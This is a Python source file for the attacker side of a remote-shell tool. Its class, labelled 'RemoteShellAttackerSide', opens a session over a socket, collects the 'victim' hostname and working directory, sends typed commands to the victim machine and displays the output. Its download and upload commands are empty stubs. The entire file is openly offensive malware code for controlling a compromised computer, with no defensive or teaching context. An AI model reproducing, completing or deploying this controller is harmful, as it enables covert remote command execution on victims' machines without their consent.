import os
import threading

from src.modlues.protocols.general import GeneralPacket, GeneralPacketType
from src.modlues.protocols.protocol import SendPacket, PacketConstants, HandelPacket, Packet, PacketType
from src.modlues.protocols.remote_shell import RemoteShellPacket, RemoteShellPacketType


class RemoteShellAttackerSide:

    def __init__(self, sock):
        self.sock = sock
        self.is_connected = False
        self.victim_info = ''
        self.victim_cwd = ''
        self.is_displayed = True

    def main(self):
        self.__connect()

        while self.is_connected:
            try:
                threading.Thread(target=self.__admin_input).start()
                packet = HandelPacket.recv_packet(self.sock)
                self.handle(packet)
                self.is_displayed = True
            except Exception as e:
                print(e)
                self.is_connected = False

            else:
                pass

    def handle(self, packet: RemoteShellPacket):
        if packet.packet_sub_type == RemoteShellPacketType.OUTPUT.value:
            self.__print_in_light_blue(packet.payload.decode())

        if packet.packet_sub_type == RemoteShellPacketType.VICTIM_INFO.value:
            self.victim_info = packet.payload.decode()

        if packet.packet_sub_type == RemoteShellPacketType.CWD.value:
            self.victim_cwd = packet.payload.decode()

    def __connect(self):
        packet = GeneralPacket(GeneralPacketType.CONNECT_RSH)
        SendPacket.send_packet(self.sock, packet)

        packet = HandelPacket.recv_packet(self.sock)

        if packet.packet_type == PacketType.GENERAL.value:
            if packet.packet_sub_type == GeneralPacketType.ACK.value:
                payload = packet.payload.decode().split(' ')
                self.victim_info = payload[0]
                self.victim_cwd = payload[1]
                self.is_connected = True

    def __admin_input(self):
        if self.is_displayed:
            raw_command = input(f'{self.victim_info} {self.victim_cwd.split("/")[-1]} $ ')
            if raw_command != '':
                command_components = raw_command.split(' ')
                command = command_components[0]
                command_args = command_components[1:]

                if command in RemoteShellAttackerSide.commands.keys():
                    RemoteShellAttackerSide.commands[command](self, command_args)
                else:
                    packet = RemoteShellPacket(RemoteShellPacketType.COMMAND, raw_command.encode())
                    SendPacket.send_packet(self.sock, packet)
                self.is_displayed = False
            self.__admin_input()

    def __help(self, args: list = None):
        print('get some help')

    def __download(self):
        pass

    def __upload(self):
        pass

    def __print_in_light_blue(self, st: str):
        print('\33[94m' + st + '\33[0m', end='')

    commands = {
        "download": __download,
        "upload": __upload,
    }
